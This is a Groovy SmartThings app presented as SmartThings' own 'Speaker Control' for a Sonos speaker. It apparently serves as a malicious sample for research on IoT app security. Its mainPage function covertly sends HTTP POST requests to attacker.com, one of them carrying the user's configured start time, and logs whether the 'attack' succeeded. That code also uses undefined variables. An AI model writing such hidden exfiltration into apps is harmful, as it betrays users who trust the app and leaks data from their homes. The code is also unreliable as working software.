
definition(
    name:"Speaker Control",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Play or pause your Speaker when certain actions take place in your home.",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos@2 x.png"
)

preferences{
    page(name:"mainPage",title:"Control your Speaker when something happens",install:true,uninstall:true)
    page(name:"timeIntervalInput",title:"Only during a certain time"){
        section{
            input"starting","time",title:"Starting",required:false
            input"ending","time",title:"Ending",required:false
            }
        }
}

def mainPage(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(oncePerDayOk(lastTime)){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        if(frequency){
            if(lastTime==null||now()-lastTime>=frequency*60000){
                takeAction(evt)
            }
            else{
                    log.debug"Not taking action because$frequency minutes have not elapsed since last action"
                }
        }
        else{
                takeAction(evt)
            }
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${starting}"
            ]
            ]
            log.debug"Not taking action because it was already taken today"
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

private anythingSet(){
    for(name in["motion","contact","contactClosed","acceleration","mySwitch","mySwitchOff","arrivalPresence","departurePresence","smoke","water","button1","triggerModes","timeOfDay"]){
        if(settings[name]){
            return true
        }
    }
    return false
}

private ifUnset(Map options,String name,String capability){
    if(!settings[name]){
        input(options,name,capability)
        }
}

private ifSet(Map options,String name,String capability){
    if(settings[name]){
        input(options,name,capability)
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    subscribeToEvents()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    unschedule()
    subscribeToEvents()
}

def subscribeToEvents(){
    log.trace"subscribeToEvents()"
    subscribe(app,appTouchHandler)
    subscribe(contact,"contact.open",eventHandler)
    subscribe(contactClosed,"contact.closed",eventHandler)
    subscribe(acceleration,"acceleration.active",eventHandler)
    subscribe(motion,"motion.active",eventHandler)
    subscribe(mySwitch,"switch.on",eventHandler)
    subscribe(mySwitchOff,"switch.off",eventHandler)
    subscribe(arrivalPresence,"presence.present",eventHandler)
    subscribe(departurePresence,"presence.not present",eventHandler)
    subscribe(smoke,"smoke.detected",eventHandler)
    subscribe(smoke,"smoke.tested",eventHandler)
    subscribe(smoke,"carbonMonoxide.detected",eventHandler)
    subscribe(water,"water.wet",eventHandler)
    subscribe(button1,"button.pushed",eventHandler)
    
    if(triggerModes){
        subscribe(location,modeChangeHandler)
    }
    
    if(timeOfDay){
        schedule(timeOfDay,scheduledTimeHandler)
    }
}

def eventHandler(evt){
    if(allOk){
        def lastTime=state[frequencyKey(evt)]
        if(oncePerDayOk(lastTime)){
            if(frequency){
                if(lastTime==null||now()-lastTime>=frequency*60000){
                    takeAction(evt)
                }
                else{
                        log.debug"Not taking action because$frequency minutes have not elapsed since last action"
                    }
            }
            else{
                    takeAction(evt)
                }
        }
        else{
                log.debug"Not taking action because it was already taken today"
            }
    }
}

def modeChangeHandler(evt){
    log.trace"modeChangeHandler$evt.name:$evt.value($triggerModes)"
    if(evt.value in triggerModes){
        eventHandler(evt)
    }
}

def scheduledTimeHandler(){
    eventHandler(null)
}

def appTouchHandler(evt){
    takeAction(evt)
}

private takeAction(evt){
    log.debug"takeAction($actionType)"
    def options=[:]
    if(volume){
        sonos.setLevel(volume as Integer)
        options.delay=1000
    }
    
    switch(actionType){
        case"Play":
            options?sonos.on(options):sonos.on()
            break
            case"Stop Playing":
            options?sonos.off(options):sonos.off()
            break
            case"Toggle Play/Pause":
            def currentStatus=sonos.currentValue("status")
            if(currentStatus=="playing"){
                options?sonos.pause(options):sonos.pause()
            }
            else{
                    options?sonos.play(options):sonos.play()
                }
            break
            case"Skip to Next Track":
            options?sonos.nextTrack(options):sonos.nextTrack()
            break
            case"Play Previous Track":
            options?sonos.previousTrack(options):sonos.previousTrack()
            break
            default:
            log.error"Action type'$actionType'not defined"
            }
    
    if(frequency){
        state.lastActionTimeStamp=now()
    }
}

private frequencyKey(evt){
    
    "lastActionTimeStamp"
}

private dayString(Date date){
    def df=new java.text.SimpleDateFormat("yyyy-MM-dd")
    if(location.timeZone){
        df.setTimeZone(location.timeZone)
    }
    else{
            df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
        }
    df.format(date)
}

private oncePerDayOk(Long lastTime){
    def result=true
    if(oncePerDay){
        result=lastTime?dayString(new Date())!=dayString(new Date(lastTime)):true
        log.trace"oncePerDayOk=$result"
    }
    result
}


private getAllOk(){
    modeOk&&daysOk&&timeOk
}

private getModeOk(){
    def result=!modes||modes.contains(location.mode)
    log.trace"modeOk=$result"
    result
}

private getDaysOk(){
    def result=true
    if(days){
        def df=new java.text.SimpleDateFormat("EEEE")
        if(location.timeZone){
            df.setTimeZone(location.timeZone)
        }
        else{
                df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
            }
        def day=df.format(new Date())
        result=days.contains(day)
    }
    log.trace"daysOk=$result"
    result
}

private getTimeOk(){
    def result=true
    if(starting&&ending){
        def currTime=now()
        def start=timeToday(starting,location?.timeZone).time
        def stop=timeToday(ending,location?.timeZone).time
        result=start<stop?currTime>=start&&currTime<=stop:currTime<=stop||currTime>=start
    }
    log.trace"timeOk=$result"
    result
}

private hhmm(time,fmt="h:mm a")
{
    def t=timeToday(time,location.timeZone)
    def f=new java.text.SimpleDateFormat(fmt)
    f.setTimeZone(location.timeZone?:timeZone(time))
    f.format(t)
}

private timeIntervalLabel()
{
    (starting&&ending)?hhmm(starting)+"-"+hhmm(ending,"h:mm a z"):""
}



